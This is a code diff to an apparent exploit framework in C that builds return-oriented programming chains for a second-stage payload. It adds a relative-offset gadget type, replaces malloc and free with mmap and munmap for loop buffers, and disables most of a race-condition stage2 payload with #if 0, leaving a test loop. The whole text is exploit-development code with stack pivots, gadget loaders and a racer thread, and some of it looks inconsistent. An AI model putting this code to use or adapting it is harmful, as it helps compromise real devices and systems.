@@ -99,6 +99,11 @@ void build_chain(int fd, offset_struct_t * offsets,rop_var_t * ropvars) {
 				write(fd,&buf,8);
 				chain_pos += 8;
 				break;
+			case REL_OFFSET:
+				buf = next->value + chain_pos + offsets->stage2_base;
+				write(fd,&buf,8);
+				chain_pos += 8;
+				break;
 			case STATIC:
 				buf = next->value;
 				write(fd,&buf,8);
@@ -144,7 +149,7 @@ void build_chain(int fd, offset_struct_t * offsets,rop_var_t * ropvars) {
 						
 						// free the buf we allocated for the loop
 						ROP_VAR_ARG64(loop_buf_name,1);
-						CALL_FUNC(get_addr_from_name(offsets,"free"),0,0,0,0,0,0,0,0);
+						CALL_FUNC(get_addr_from_name(offsets,"munmap"),0,0,0,0,0,0,0,0);
 						
 						// pivot the stack to where we want it
 						CALL_FUNC(offsets->stack_pivot,0,0,0,0,0,0,0,0);
@@ -173,13 +178,16 @@ void build_chain(int fd, offset_struct_t * offsets,rop_var_t * ropvars) {
 						curr_gadget->next = NULL;
 						curr_gadget->type = NONE;
 						curr_gadget->comment = NULL;
-						int ropchain_len = chain_pos/8;
+						int ropchain_len = (chain_pos-offset_delta)/8+1;
 						int rop_var_tmp_nr = 0;
+
+						int map_needed = loop_size;
+						if (loop_size < 0x4000) {map_needed = 0x4000;}
 						
-						CALL_FUNC_RET_SAVE_VAR(loop_buf_name,get_addr_from_name(offsets,"malloc"),loop_size,0,0,0,0,0,0,0);
+						CALL_FUNC_RET_SAVE_VAR(loop_buf_name,get_addr_from_name(offsets,"__mmap"),NULL,map_needed & ~0x3fff,PROT_READ | PROT_WRITE,MAP_PRIVATE | MAP_ANON,0,0,0,0);
 
 						ROP_VAR_ARG64(loop_buf_name,1);
-						chain_start = chain_pos + offsets->stage2_base + (ropchain_len*8-chain_pos) + 16*8; /* to get behind that memcpy call */
+						chain_start = chain_pos + offsets->stage2_base + (ropchain_len*8-chain_pos-offset_delta) + 15*8; /* to get behind that memcpy call */
 						CALL_FUNC(get_addr_from_name(offsets,"memcpy"),0,chain_start,loop_size,0,0,0,0,0);
 
 						curr_gadget->next = bck_next;
@@ -197,7 +205,7 @@ void build_chain(int fd, offset_struct_t * offsets,rop_var_t * ropvars) {
 						curr_gadget->next = NULL;
 						curr_gadget->type = NONE;
 						curr_gadget->comment = NULL;
-						int ropchain_len = lookahead_pos/8;
+						int ropchain_len = (lookahead_pos-offset_delta)/8+1;
 						int rop_var_tmp_nr = 0;
 						
 						
@@ -218,7 +226,7 @@ void build_chain(int fd, offset_struct_t * offsets,rop_var_t * ropvars) {
 						curr_gadget->next = NULL;
 						curr_gadget->type = NONE;
 						curr_gadget->comment = NULL;
-						int ropchain_len = lookahead_pos/8;
+						int ropchain_len = (lookahead_pos-offset_delta)/8+1;
 						int rop_var_tmp_nr = 0;
 						
 						/* TLDR on what that monster does:
@@ -266,8 +274,10 @@ void build_chain(int fd, offset_struct_t * offsets,rop_var_t * ropvars) {
 						ADD_CODE_GADGET(offsets->BEAST_GADGET_LOADER); /* x30 (not 0) */
 						
 						// free the buf we allocated for the loop
+						int map_needed = loop_size;
+						if (loop_size < 0x4000) {map_needed = 0x4000;}
 						ROP_VAR_ARG64(loop_buf_name,1);
-						CALL_FUNC(get_addr_from_name(offsets,"free"),0,0,0,0,0,0,0,0);
+						CALL_FUNC(get_addr_from_name(offsets,"munmap"),0,map_needed & ~0x3fff,0,0,0,0,0,0);
 						
 						// pivot the stack to where we want it
 						CALL_FUNC(offsets->stack_pivot,0,chain_start+loop_size,0,0,0,0,0,0);
@@ -361,6 +371,15 @@ void build_chain_DBG(offset_struct_t * offsets,rop_var_t * ropvars) {
 				current_addr += 8;
 				pos++;
 				break;
+			case REL_OFFSET:
+				buf = next->value + current_addr;
+				pos_buf = pos_description_DBG(pos,longjmp_buf);
+				printf("0x%.8llx: ",current_addr);
+				printf("0x%.8llx (offset) %s\n",buf,pos_buf);
+				free(pos_buf);
+				current_addr += 8;
+				pos++;
+				break;
 			case STATIC:
 				buf = next->value;
 				pos_buf = pos_description_DBG(pos,longjmp_buf);
@@ -414,7 +433,7 @@ void build_chain_DBG(offset_struct_t * offsets,rop_var_t * ropvars) {
 						
 						// free the buf we allocated for the loop
 						ROP_VAR_ARG64(loop_buf_name,1);
-						CALL_FUNC(get_addr_from_name(offsets,"free"),0,0,0,0,0,0,0,0);
+						CALL_FUNC(get_addr_from_name(offsets,"munmap"),0,0,0,0,0,0,0,0);
 						
 						// pivot the stack to where we want it
 						CALL_FUNC(offsets->stack_pivot,0,0,0,0,0,0,0,0);
@@ -443,15 +462,17 @@ void build_chain_DBG(offset_struct_t * offsets,rop_var_t * ropvars) {
 						curr_gadget->next = NULL;
 						curr_gadget->type = NONE;
 						curr_gadget->comment = NULL;
-						int ropchain_len = (current_addr-offsets->stage2_base)/8;
+						int ropchain_len = (current_addr-offsets->stage2_base-offset_delta)/8+1;
 						int rop_var_tmp_nr = 0;
 						
-						ADD_COMMENT("malloced a buffer where we will copy the loop");
-						CALL_FUNC_RET_SAVE_VAR(loop_buf_name,get_addr_from_name(offsets,"malloc"),loop_size,0,0,0,0,0,0,0);
+						int map_needed = loop_size;
+						if (loop_size < 0x4000) {map_needed = 0x4000;}
+						ADD_COMMENT("mmaped a buffer where we will copy the loop");
+						CALL_FUNC_RET_SAVE_VAR(loop_buf_name,get_addr_from_name(offsets,"__mmap"),NULL,map_needed & ~0x3fff,PROT_READ | PROT_WRITE,MAP_PRIVATE | MAP_ANON,0,0,0,0);
 
 						ADD_COMMENT("Copy the loop");
 						ROP_VAR_ARG64(loop_buf_name,1);
-						chain_start = current_addr + (ropchain_len*8-(current_addr-offsets->stage2_base)) + 16*8; /* to get behind that memcpy call */
+						chain_start = current_addr + (ropchain_len*8-(current_addr-offsets->stage2_base-offset_delta)) + 15*8; /* to get behind that memcpy call */
 						CALL_FUNC(get_addr_from_name(offsets,"memcpy"),0,chain_start,loop_size,0,0,0,0,0);
 
 						curr_gadget->next = bck_next;
@@ -469,7 +490,7 @@ void build_chain_DBG(offset_struct_t * offsets,rop_var_t * ropvars) {
 						curr_gadget->next = NULL;
 						curr_gadget->type = NONE;
 						curr_gadget->comment = NULL;
-						int ropchain_len = lookahead_pos/8;
+						int ropchain_len = (lookahead_pos-offset_delta)/8+1;
 						int rop_var_tmp_nr = 0;
 						
 						
@@ -491,7 +512,7 @@ void build_chain_DBG(offset_struct_t * offsets,rop_var_t * ropvars) {
 						curr_gadget->next = NULL;
 						curr_gadget->type = NONE;
 						curr_gadget->comment = NULL;
-						int ropchain_len = lookahead_pos/8;
+						int ropchain_len = (lookahead_pos-offset_delta)/8+1;
 						int rop_var_tmp_nr = 0;
 
 						/* TLDR on what that monster does:
@@ -540,9 +561,11 @@ void build_chain_DBG(offset_struct_t * offsets,rop_var_t * ropvars) {
 
 						
 						// free the buf we allocated for the loop
+						int map_needed = loop_size;
+						if (loop_size < 0x4000) {map_needed = 0x4000;}
 						ADD_COMMENT("free the copy of our loop");
 						ROP_VAR_ARG64(loop_buf_name,1);
-						CALL_FUNC(get_addr_from_name(offsets,"free"),0,0,0,0,0,0,0,0);
+						CALL_FUNC(get_addr_from_name(offsets,"munmap"),0,loop_size & ~0x3fff,0,0,0,0,0,0);
 						
 						ADD_COMMENT("stack pivot mov sp,x2");
 						// pivot the stack to where we want it
@@ -621,6 +644,20 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	CALL_FUNC_RET_SAVE_VAR("test",0x40,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48);
 	*/
 
+#define CALL(name,arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8) \
+	ADD_COMMENT(name); \
+	CALL_FUNC(get_addr_from_name(offsets,name),arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8);
+
+	char * buf[1024];
+	snprintf(&buf,sizeof(buf),"testing...");
+	DEFINE_ROP_VAR("test_string",sizeof(buf),&buf);
+
+	ADD_LOOP_START("test_loop")
+		ROP_VAR_ARG("test_string",2);
+		CALL("write",1,0,10,0,0,0,0,0);
+	ADD_LOOP_END();
+
+#if 0
 	
 	// SETUP VARS
 	char * tmp = malloc(0x1000);
@@ -697,12 +734,6 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	snprintf(wedidit_msg,100,"WE DID IT\n");
 	DEFINE_ROP_VAR("WEDIDIT",strlen(wedidit_msg)+1,wedidit_msg);
 
-
-#define CALL(name,arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8) \
-	ADD_COMMENT(name); \
-	CALL_FUNC(get_addr_from_name(offsets,name),arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8);
-
-
 #define BARRIER_BUFFER_SIZE 0x10000
 	// spawn racer thread
 	DEFINE_ROP_VAR("racer_thread",sizeof(pthread_t),tmp);
@@ -770,8 +801,8 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 
 	SET_ROP_VAR64("should_race",1); // stop the other thread
 
-	ROP_VAR_ARG("WEDIDIT",1);
-	CALL("puts",0,0,0,0,0,0,0,0);
+	ROP_VAR_ARG("WEDIDIT",2);
+	CALL("write",1,0,strlen(wedidit_msg),0,0,0,0,0);
 
 	CALL("sleep",10000,0,0,0,0,0,0,0);
 
@@ -992,6 +1023,8 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	ADD_LOOP_END();
 
 	CALL("pthread_exit",0,0,0,0,0,0,0,0);
+
+#endif
 
 	if (curr_rop_var != NULL) {
 		build_databuffer(offsets,rop_var_top);
